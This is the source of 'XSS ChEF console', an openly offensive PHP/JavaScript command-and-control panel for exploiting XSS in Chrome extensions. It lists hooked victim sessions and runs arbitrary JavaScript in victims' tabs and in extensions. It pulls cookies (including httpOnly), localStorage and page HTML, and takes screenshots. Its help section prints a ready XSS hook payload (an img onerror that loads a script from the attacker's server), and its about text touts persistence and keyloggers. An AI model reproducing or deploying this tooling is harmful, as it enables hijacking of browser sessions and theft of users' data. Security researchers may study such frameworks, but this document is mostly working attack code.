<?php 
$hook_url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/console.php', '/hook.php', $_SERVER['SCRIPT_NAME']);
?>
<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script src="bootstrap/js/bootstrap.min.js"></script>
<title>XSS ChEF console</title>
<link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
<style>
body {padding-top: 50px;}
span,td,th {font-size: 11px; line-height: 14px;}
#tabs-container {
overflow-y: auto;
}
.currentTableRow td {
background-color: #0088CC !important;
color: #FFFFFF !important;
}
.modal {
display:none;
}

.mono {
font-family: Menlo, Monaco, "Courier New", monospace;
}
#alert {
position: absolute;
top: 45px;
right: 20px;
display:none;
}
</style>
<body>
<div class="navbar navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
        <ul class="nav pull-right">
            <li><a href="#about-modal" data-toggle=modal>About</a></li>
            <li><a href="#help-modal" data-toggle=modal>Help</a></li>
        </ul>
            <a class="brand"  href="#">XSS <abbr title="Chrome exploitation framework">ChEF</abbr> console by @kkotowicz</a>
        </div>
    </div>
</div>
<div class="container">
    <div class="row">
            <div class="tabbable">
                <ul class="nav nav-tabs">
                    <li><button title="Choose hooked session" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;&nbsp;</li>
                    <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
                    <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
                    <li><a href="#tab-ext-commands" data-toggle="tab">Extension commands</a></li>
                    <li> <button id=refresh-hook title="Refresh this hook" class='btn btn-secondary'><i class="icon-refresh"></i></button> </li>
                </ul>
                <div class="tab-content">
                    <div class="tab-pane active" id="tab-tabs">
                        <div class="row">
                            <div class="span4" id="tabs-container">
                                <table class="table-striped table table-condensed">
                                <thead>
                                <tr>
                                    <th>
                                        ID
                                    </th>
                                    <th>
                                        Title
                                    </th>
                                </tr>
                                <tr style=display:none id=tab-template>
                                    <td data-fld=id>
                                        1
                                    </td>
                                    <td class="url">
                                        <a href=# target=_blank data-attr=href data-fld=url><i class="icon-share"></i></a>
                                        <img data-fld=favIconUrl data-attr=src src="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACBAAAeaR9cIAAAAASUVORK5CYII=" />
                                        <span data-fld=title></span>
                                    </td>
                                    </tr>
                
                                </thead>
                                <tbody id="hook-tabs">
                                    </tbody>
                                    </table>
                                </div>
                                <div class="span8">
                                    <div class="tabbable">
                                        <ul class="nav nav-tabs">
                                            <li class="active"><a href="#tab-info" class='active' data-toggle="tab">Info</a></li>
                                            <li><a href="#tab-commands" data-toggle="tab">Commands</a></li>
                                            <li><a href="#tab-html" data-toggle="tab">HTML</a></li>
                                        </ul>
                                        <div class="tab-content">
                                            <div class="tab-pane" id="tab-commands">
                                                <form class="well" action="#">
                                                    <h4>Eval</h4>
                                                    <textarea class=mono name=eval style="width: 100%; height: 100px" placeholder="alert(/place code to eval in this tab here/)"></textarea>
                                                    <button id=eval type="button" class="btn btn-primary">Eval</button>
                                                    </p>
                                                    <h4>Result</h4>
                                                    <textarea class=mono style="width: 100%; height: 300px" id=eval-result placeholder="result will be placed here."></textarea>
                                                </form>
                                            </div>
                                            <div class="tab-pane" id="tab-html">
                                                <p><button id=report-html type=button class="btn btn-primary">Get HTML</button></p>
                                                <textarea id=tab-current-html style="width: 100%; height: 300px">
                                                </textarea>
                                            </div>
                                            <div class="tab-pane" id="tab-info">
                                                <table class="table-striped table table-condensed">
                                                <tbody>
                                                <tr>
                                                <th>URL</th><td data-fld=url></td>
                                                </tr>
                                                <tr>
                                                <th>Cookies</th><td class=mono data-fld=cookies></td>
                                                </tr>
                                                <tr>
                                                <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
                                                </tr>
                                                </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane" id="tab-ext-info">
                        <table class="table-striped table table-condensed">
                        <tbody>
                        <tr>
                        <th>Hook ID</th><td id=hook-id></td>
                        </tr>
                        <tr>
                        <th>URL</th><td data-fld=extension></td>
                        </tr>
                        <tr>
                        <th>Permissions</th><td class=mono data-fld=permissions></td>
                        </tr>

                        <tr>
                        <th>Cookies</th><td class=mono data-fld=cookies></td>
                        </tr>
                        <tr>
                        <th>localStorage</th><td><textarea class=mono style="width: 100%; height: 200px" data-fld=localStorage></textarea></td>
                        </tr>
                        <tr>
                        <th>HTML</th><td><textarea style="width: 100%; height:200px" data-fld=html></textarea></td>
                        </tr>

                        </tbody>
                        </table>
                    
                        </form>
                        </div>
                        <div class="tab-pane" id="tab-ext-commands">
                               <ul class="nav nav-pills">
            <li><button id=fix-server class='btn btn-secondary'><i class="icon-fire"></i> Fix server</button></li>
            <li><button id=ping class='btn btn-secondary'>Ping</button></li>
            <li><button id=do-screenshot class='btn btn-secondary'><i class="icon-picture"></i> Screenshot</button></li>
            </ul>
                        <div class=control-group>

            <label>Create new tab</label>
            <input id="tab-create-url" style="padding:0" placeholder="http://example.com/" />
                            <form action="#">
                                <label>Eval</label>
                                <textarea name=eval-ext class="mono span8" placeholder="alert(/place code to eval in extension/)"></textarea>
                                <p><button type="button" id=eval-ext class="btn btn-secondary">Eval</button></p>
                                <label>Result</label>
                                <textarea id=eval-ext-result class="mono span8" placeholder="result will be placed here."></textarea>
                            </form>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="row">
            <div class="span12">
                <form>
                    <label>Log</label>
                        <textarea id='log' style="width: 100%; height: 150px;"></textarea>
                    </div>
                </div>
            </div>
            
<div class="modal" id="screenshot-modal">
  <div class="modal-header">
    <a class="close" data-dismiss="modal">&times;</a>
    <h3>Screenshot</h3>
  </div>
  <div class="modal-body">
    <img id=screenshot />
  </div>
</div>

<div class="modal" id="choose-hook-modal">
  <div class="modal-header">
    <a class="close" data-dismiss="modal">&times;</a>
    <h3>Choose hooked session</h3>
  </div>
  <div class="modal-body">
  <p>Each hook below represents single browser session that XSS has been activated in. Chose one you'd like to
  exploit:</p>
  <select name="choose-hook">
  </select>
  </div>
  <div class=modal-footer>
  <a href="#" id=hook-chosen class="btn btn-primary">Choose hook</a>
  <a href="#" class="btn" data-dismiss=modal>Cancel</a>
</div>
</div>

<div class="modal" id="about-modal">
  <div class="modal-header">
    <a class="close" data-dismiss="modal">&times;</a>
    <h3>About XSS ChEF</h3>
  </div>
  <div class="modal-body">
      <h2>XSS <abbr title="Chrome exploitation framework">ChEF</a></h2>
      <h3>by <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a>
      <p>v.0.1</p>
      <h4>About</h4>
      <p>This is a Chrome Exploitation Framework - think <a href="http://www.bindshell.net/tools/beef.html">BeEF</a> for Chrome extensions.
      Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will ease the exploitation.
      <p>What can you actually do (when having appropriate permissions)?</p>
      <ul>
      <li>Monitor open tabs of victims</li>
      <li>Execute JS on every tab (global XSS)</li>
      <li>Extract HTML, read/write cookies (also httpOnly), localStorage</li>
      <li>Stay persistent until whole browser is closed (or even futher if you can persist in extensions' localStorage)</li>
      <li>Make screenshot of your window</li>
      <li>Further exploit e.g. via attaching BeEF hooks, keyloggers etc.</li>
      </ul>
  </div>
  </div>
<div class="modal" id="help-modal">
  <div class="modal-header">
    <a class="close" data-dismiss="modal">&times;</a>
    <h3>Help</h3>
  </div>  
    <div class="modal-body">
      <p>First, you need to find a XSS vulnerable Chrome extension. I won't help here. Once you've found it, inject Chrome extension with a hook vector:
      <pre>if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='<?php echo $hook_url ?>';d.body.appendChild(e);}</pre>
      <p>For example:
      <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='<?php echo $hook_url ?>';d.body.appendChild(e);}"&gt;</pre>
      <p>After hook has been executed, launch this console (in a separate browser), choose hooked session by clicking on the <i class="icon-list"></i> and start having fun!
  </div>
</div>

<div id="alert" class="alert alert-info span3">
  <a class="close" data-dismiss="alert">&times;</a>
  <span id="alert-msg"></span>
</div>
<script>

// current hook name
var hook = '';
var currentTab = null;

var sendCmd = function(cmd, param, additional) {
    var to_send = {cmd:cmd, p:param};
    if (additional) {
        to_send = $.extend(to_send, additional);
    }
    $.post('server.php?ch=' + encodeURIComponent(hook) + '-cmd', JSON.stringify(to_send));
};

function log(m) {
       var text = (typeof m == 'string' ? m : JSON.stringify(m));
        $("#log")[0].value += text + "\n";
        $('#log')[0].scrollTop = 9999999;
}

function clickTab() {
    loadTabData($(this).attr('data-tabid'));
    currentTab = $(this).attr('data-tabid');
    $('.currentTableRow').removeClass('currentTableRow');
    $(this).closest('tr').addClass('currentTableRow');
}

var hookStorage = {
    store: function(hook, key, value) {
        if (!localStorage['hooks']) {
            localStorage['hooks'] = JSON.stringify({});
        }
        
        var hooks = JSON.parse(localStorage['hooks']);

        if (!hooks[hook]) {
            hooks[hook] = {}
        }
        
        hooks[hook][key] = value;
        localStorage['hooks'] = JSON.stringify(hooks);
    },
    
    updateTab: function(hook, id, data) {
        var tab = this.getTab(hook, id);
        tab = $.extend(tab, data);
        this.setTab(hook, id, tab);
    },
    
    getTabs: function(hook) {
        return this.retrieve(hook, 'tabs', []);
    },
    
    setTabs: function(hook, tabs) {
        return this.store(hook, 'tabs', tabs);
    },
    
    getTab: function(hook, id) {
        var tabs = this.getTabs(hook);
        for (var i = 0; i < tabs.length; i++) {
            if (tabs[i].id == id) {
                return tabs[i];
            }
        }
        return {}
    },
    
    setTab: function(hook, id, tab) {
        var tabs = this.getTabs(hook);
        for (var i = 0; i < tabs.length; i++) {
            if (tabs[i].id == id) {
                tabs[i] = tab;
                this.setTabs(hook, tabs);
                return;
            }
        }
        tabs.push(tab);
        this.setTabs(hook, tabs);
        return;
    },
    
    retrieve: function(hook, key, def) {
        try {
            return JSON.parse(localStorage['hooks'])[hook][key];
        } catch (e) {
            return def;
        }
    }
};

function fillDataTemplate(node, data) {
        for (var j in data) {
            var text = typeof data[j] == 'string' ? data[j] : JSON.stringify(data[j]);
            $('[data-fld="' + j + '"]', node).each(function() {
                if (this.attributes['data-attr']) {
                    this[this.attributes['data-attr'].value] = text;
                } else {
                    if ($(this).is(':input')) {
                        $(this).val(text);
                    } else {
                        $(this).text(text);
                    }
                }
            });
        }
}

function refreshTabsTable(t) {
    $("#hook-tabs").html('');
    for (var i = 0; i < t.length;  i++) {
        var c = $('#tab-template').clone();
        var tab = t[i];
        c.attr('data-tabid', tab.id);
        c.attr('id', '');
        
        fillDataTemplate(c, tab);
        
        c.click(clickTab);
        c.appendTo('#hook-tabs').show();
    }
}

function loadTabData(id) {
    var tab = hookStorage.getTab(hook,id);
    if (!tab) {
        alert('no tab!');
        return;
    }
    $("#tab-current-html").val(tab.html);
    fillDataTemplate($('#tab-info'), tab);
    
}

function al(txt) {
    $('#alert-msg').text(txt);
    $('#alert').fadeIn().delay(1500).fadeOut();
}

function processResponse(r, hook) {
    if (typeof r == 'string' || !r.type) {
        log(JSON.stringify(r));
        console.log(r);
        return;
    }
    switch (r.type) {
        case 'recvstuff':
            hookStorage.updateTab(hook, r.id, r.result);
            refreshTabsTable(hookStorage.getTabs(hook));
            al('Received response.');
        break;
        case 'recvscreenshot':
            $("#screenshot").attr('src', r.url);
            $('#screenshot-modal').modal('show');
            break;
        break;        
        case 'recveval':
            al('Received eval response.');
            if (!r.id) {
                $('#eval-ext-result').val(JSON.stringify(r.result));
            } else {
                $('#eval-result').val(JSON.stringify(r.result));
            }
        break;
        case 'report_tabs':
            hookStorage.setTabs(hook, r.result);
            refreshTabsTable(hookStorage.getTabs(hook));
            al('New tab list received');
        break;
        case 'report_ext':
            hookStorage.store(hook, 'info', r.result);
            fillDataTemplate($('#tab-ext-info'), r.result);
        break;
        case 'pong':
            al('Pong from ' + r.url);
            log('pong ' + r.url);
        break;
    }
}
$(function() {
    
    $('#do-screenshot').click(function() {
        sendCmd('screenshot');
    });

    $('#eval-ext').click(function() {
        sendCmd('eval', $('[name=eval-ext]').val());
        $('#eval-ext-result').val('');
    });

    $('#eval').click(function() {
        if (!currentTab) {
            al("No tab selected!");
        } else {
            sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
            $('#eval-result').val('');
        }
    });

    $('#report-html').click(function() {
        sendCmd('reporthtml', null, {id: currentTab});
    });
    
    $('#ping').click(function() {
        sendCmd('ping');
    });    
    
    $("#refresh-hook").click(function() {
        refreshTabsTable([]);
        sendCmd('report');
    });

    $("#tab-create-url").keydown(function(e) {
        if (e.keyCode == '13' && this.value) {
            sendCmd('createtab', this.value);
        }
    });
    
    $('#hook-chosen').click(function() {
        var v;
        if (v = $('select[name="choose-hook"]').val()) {
            hook = v;
            $('#hook-id').text(v);
            al('Chosen hook: ' + v);
            $('#choose-hook-modal').modal('hide');
            sendCmd('report');

        }
        return false;
    });
    
    $('#choose-hook').click(function() {
        $.getJSON('server.php', function(json) {
            if (!json.length) {
                al("No hooks present...");
                return;
            }
            var $s = $('select[name="choose-hook"]').html('');
            $s.append($('<option>').text('choose...'));
            
            for (var i =0; i < json.length; i++) {
                $('<option>').text(json[i]).val(json[i]).appendTo($s);
            }
            $s.val(hook); // select current hook
            $('#choose-hook-modal').modal('show');

        });
        return false;
    })
    
    $("#fix-server").click(function() {
        $.get('server.php?delete=1');
    });
    
    setInterval(function() {
        if (hook) {
            $.getJSON('server.php?ch=' + encodeURIComponent(hook), function(json) {
                for (var i=0; i < json.length; i++) {
                    processResponse(json[i][0],hook);
                }
            });
        }
    }, 2000);
    
    // start with saved data
    refreshTabsTable(hookStorage.getTabs(hook));
    al("Refreshed state from local storage");
    fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));



});
</script>
</body>
</html>